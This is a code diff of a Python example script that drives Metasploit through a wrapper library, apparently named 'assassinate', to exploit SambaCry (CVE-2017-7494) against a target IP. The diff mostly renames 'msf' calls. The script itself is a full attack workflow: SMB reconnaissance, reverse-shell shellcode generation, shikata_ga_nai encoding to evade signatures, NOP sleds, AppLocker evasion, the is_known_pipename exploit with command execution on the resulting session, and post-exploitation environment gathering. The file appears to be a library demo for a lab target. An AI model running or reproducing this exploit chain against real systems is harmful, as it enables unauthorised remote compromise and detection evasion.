@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""SambaCry (CVE-2017-7494) exploit using the low-level msf API.
+"""SambaCry (CVE-2017-7494) exploit using the assassinate API.
 
 Demonstrates all 7 MSF module types in a realistic workflow.
 
@@ -12,16 +12,16 @@ Configuration:
 
 Usage:
     # Run full workflow (default)
-    python sambacry_msf.py 172.19.0.3
+    python sambacry.py 172.19.0.3
 
     # Skip specific phases
-    python sambacry_msf.py 172.19.0.3 --no-recon
-    python sambacry_msf.py 172.19.0.3 --no-payload-gen
-    python sambacry_msf.py 172.19.0.3 --no-post
+    python sambacry.py 172.19.0.3 --no-recon
+    python sambacry.py 172.19.0.3 --no-payload-gen
+    python sambacry.py 172.19.0.3 --no-post
 """
 
 import argparse
-import msf
+import assassinate
 from assassinate.config import get_config
 
 
@@ -41,11 +41,11 @@ def main():
     # Initialize MSF using config system
     config = get_config()
     if not config.metasploit.root:
-        print("[-] MSF not found. Set ASAS_METASPLOIT__ROOT or run: assassinate-setup --config")
+        print("[-] MSF not found. Set ASAS_METASPLOIT__ROOT or run: assassinate config --save")
         return 1
 
-    msf.init_msf(str(config.metasploit.root))
-    print(f"[*] MSF {msf.framework_version()} initialized")
+    assassinate.init_msf(str(config.metasploit.root))
+    print(f"[*] MSF {assassinate.framework_version()} initialized")
     print(f"[*] Target: {args.target}\n")
 
     # =========================================================================
@@ -56,7 +56,7 @@ def main():
         print("PHASE 1: RECONNAISSANCE (AuxiliaryModule)")
         print("=" * 60)
 
-        scanner = msf.create_module("auxiliary/scanner/smb/smb_version")
+        scanner = assassinate.create_module("auxiliary/scanner/smb/smb_version")
         print(f"[*] Module: {scanner.fullname}")
         print(f"[*] Type: {scanner.module_type}")
 
@@ -74,7 +74,7 @@ def main():
 
         # --- PayloadModule ---
         print("\n[PayloadModule] Generate shellcode:")
-        payload = msf.create_module("payload/linux/x86/shell_reverse_tcp")
+        payload = assassinate.create_module("payload/linux/x86/shell_reverse_tcp")
         payload.options.LHOST = "127.0.0.1"
         payload.options.LPORT = "4444"
         shellcode = payload.generate()
@@ -82,7 +82,7 @@ def main():
 
         # --- EncoderModule ---
         print("\n[EncoderModule] Encode to evade signatures:")
-        encoder = msf.create_module("encoder/x86/shikata_ga_nai")
+        encoder = assassinate.create_module("encoder/x86/shikata_ga_nai")
         encoded = encoder.encode_payload(
             "linux/x86/shell_reverse_tcp",
             iterations=3,
@@ -93,13 +93,13 @@ def main():
 
         # --- NopModule ---
         print("\n[NopModule] Generate NOP sled:")
-        nop = msf.create_module("nop/x86/single_byte")
+        nop = assassinate.create_module("nop/x86/single_byte")
         sled = nop.generate_sled(16, badchars=b"\x00")
         print(f"    Sled: {len(sled)} bytes - {sled.hex()}")
 
         # --- EvasionModule (info only) ---
         print("\n[EvasionModule] AV bypass options:")
-        evasion = msf.create_module("evasion/windows/applocker_evasion_msbuild")
+        evasion = assassinate.create_module("evasion/windows/applocker_evasion_msbuild")
         print(f"    Module: {evasion.fullname}")
         print(f"    Targets: {evasion.targets[:2]}...")
         print()
@@ -111,7 +111,7 @@ def main():
     print("PHASE 3: EXPLOITATION (ExploitModule)")
     print("=" * 60)
 
-    exploit = msf.create_module("exploit/linux/samba/is_known_pipename")
+    exploit = assassinate.create_module("exploit/linux/samba/is_known_pipename")
     print(f"[*] Module: {exploit.fullname}")
     print(f"[*] Type: {exploit.module_type}")
     print(f"[*] Rank: {exploit.rank}")
@@ -135,7 +135,7 @@ def main():
 
     # --- Method B: PayloadModule object (reusing same exploit module) ---
     print("\n[Method B] PayloadModule object:")
-    payload_mod = msf.create_module("payload/cmd/unix/interact")
+    payload_mod = assassinate.create_module("payload/cmd/unix/interact")
     session = exploit.exploit(payload_mod, timeout=60)
     if session:
         print(f"    Session {session.sid}: {session.run_cmd('whoami').strip()}")
@@ -152,7 +152,7 @@ def main():
         print("PHASE 4: POST-EXPLOITATION (PostModule)")
         print("=" * 60)
 
-        post = msf.create_module("post/multi/gather/env")
+        post = assassinate.create_module("post/multi/gather/env")
         print(f"[*] Module: {post.fullname}")
         print(f"[*] Type: {post.module_type}")
 
